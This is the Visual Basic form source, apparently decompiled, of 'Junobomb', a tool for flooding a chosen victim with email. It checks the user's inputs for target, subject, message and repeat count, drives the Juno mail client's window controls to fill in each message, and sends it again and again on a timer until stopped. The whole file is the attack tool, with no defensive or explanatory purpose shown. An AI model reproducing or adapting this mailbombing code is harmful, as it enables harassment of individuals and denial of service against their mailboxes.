' JUNOBOMB.FRM
Option Explicit

Sub Command3D1_Click ()
If  Text1.Text = "" Then
MsgBox "You must specify who you want to mailbomb!", 16
Exit Sub
End If
If  Text2.Text = "" Then
MsgBox "You must enter in a subject!", 16
Exit Sub
End If
If  Text3.Text = "" Then
MsgBox "You must enter in a message!", 16
Exit Sub
End If
If  Text5.Text = "" Then
MsgBox "You must enter in how many times to mailbomb!", 16
Exit Sub
End If
If  Not IsNumeric(Text5.Text) Then
MsgBox "You must enter in how many times to mailbomb!", 16
Exit Sub
End If
If  Command3D1.Caption = "Start" Then
Command3D1.Caption = "Stop"
Timer1.Enabled = True
Timer1.Interval = 1
Else
Command3D1.Caption = "Start"
Timer1.Interval = 0
Timer1.Enabled = False
End If
End Sub

Sub Command3D2_Click ()
Unload Junobomb
End Sub

Sub Form_Load ()
extsub1050 Junobomb.hWnd, -1, 0, 0, 0, 0, 3
End Sub

Sub Timer1_Timer ()
Dim l0044 As Variant
Dim l004C As Variant
Dim l0052 As Variant
Dim l0058 As Variant
Dim l005C As Variant
Dim l0062 As Variant
Dim l0066 As Variant
Dim l006A As Variant
Dim l006E As Variant
Dim l0072 As Variant
Dim l0076 As Variant
Dim l007A As Variant
Dim l007E As Variant
Dim l0082 As Variant
Dim l0088 As Variant
Dim l008E As Variant
Dim l0094 As Variant
Dim l009A As Variant
l0044 = extfn1018("afx:b:1526:6:4297", 0&)
If  l0044 = 0 Then
MsgBox "Juno Could Not Be Found. Make sure you have it loaded!", 16
GoTo L6956A
Exit Sub
End If
pwait.Show
For l004C = 1 To Text5.Text
If  Timer1.Interval = 0 Then GoTo L6956A
l0052 = extfn10F8(l0044, "To:")
l0058 = extfn1168(l0052, 3)
l005C = extfn1168(l0058, 1)
l0062 = extfn11A0(l005C, 12, 0, Text3.Text)
l0066 = extfn10F8(l0044, "Subject:")
l006A = extfn1168(l0066, 3)
l006E = extfn11A0(l006A, 12, 0, Text2.Text)
l0072 = extfn10F8(l0044, "Subject:")
l0076 = extfn1168(l0072, 3)
l007A = extfn1168(l0076, 3)
l007E = extfn1168(l007A, 3)
l0082 = extfn11A0(l007E, 12, 0, Text1.Text)
l0088 = extfn1790(l0044)
l008E = extfn17C8(l0088, 0)
l0094 = extfn1800(l008E, 2)
l009A = extfnFE0(l0044, 273, l0094, 0)
If  Timer1.Interval = 0 Then GoTo L6956A
DoEvents
If  Timer1.Interval = 0 Then GoTo L6956A
Next l004C
L6956A:
Timer1.Interval = 0
Command3D1.Caption = "Start"
Unload pwait
End Sub
